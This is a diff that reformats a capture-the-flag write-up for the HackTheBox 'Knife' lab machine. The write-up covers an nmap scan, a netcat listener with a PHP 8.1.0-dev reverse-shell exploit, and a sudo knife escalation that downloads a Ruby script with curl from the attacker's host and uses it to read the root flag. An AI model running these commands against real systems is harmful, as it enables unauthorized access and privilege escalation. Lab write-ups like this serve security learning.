@@ -5,8 +5,8 @@ This is an Easy box, utilizes a recently famous vulnerability to gain access thr
 
 **Tools: nmap, whatweb, netcat.**
 
-We begin with the nmap scan: 
-> nmap -Pn -sC -sV --min-rate=10000 -p- 10.10.10.242
+We begin with the nmap scan:  
+`nmap -Pn -sC -sV --min-rate=10000 -p- 10.10.10.242`
 
 ![Knife](../Images/htb_knife_2.png)
 
@@ -19,16 +19,16 @@ The exploit at the exploit-db page was causing me some trouble during my attempt
 
 ![Knife](../Images/htb_knife_4.png)
 
-Start a netcat listener in your machine:
-> nc -vnlp 9001
+Start a netcat listener in your machine:  
+`nc -vnlp 9001`
 
-Then in another terminal window we can run the exploit with the command:
-> python3 revshell_php_8.1.0-dev.py \<targetURL> \<hostIP> \<port>
+Then in another terminal window we can run the exploit with the command:  
+`python3 revshell_php_8.1.0-dev.py <targetURL> <hostIP> <port>`
 
 ![Knife](../Images/htb_knife_5.png)
 
-With this, we get a reverse shell as the user 'james'. We can get the user flag from this account's home directory. 
-> cat /home/james/user.txt
+With this, we get a reverse shell as the user 'james'. We can get the user flag from this account's home directory.  
+`cat /home/james/user.txt`
 
 ![Knife](../Images/htb_knife_6.png)
 
@@ -36,19 +36,21 @@ Next up, with 'sudo -l' we see that the user can run the 'knife' binary with sud
 
 ![Knife](../Images/htb_knife_7.png)
 
-We can create a Ruby script to either escalate our privileges, or, in this case, read the root flag right away:
-> puts File.read("/root/root.txt")
+We can create a Ruby script to either escalate our privileges, or, in this case, read the root flag right away:  
+`puts File.read("/root/root.txt")`
 
 Save it to a ruby file (.rb)  
 
-I started a python http server in my machine:
-> python3 -m http.server 80
+I started a python http server in my machine:  
+`python3 -m http.server 80`
 
 ![Knife](../Images/htb_knife_8.png)
 
-Now we simply need to download the file with curl and then run the command to execute the script in the box: 
-> curl \<hostIP>/rb.rb > /home/james/rb.rb  
-> sudo knife /home/james/rb.rb
+Now we simply need to download the file with curl and then run the command to execute the script in the box:  
+```
+curl <hostIP>/rb.rb > /home/james/rb.rb  
+sudo knife /home/james/rb.rb
+```
 
 ![Knife](../Images/htb_knife_9.png)
 
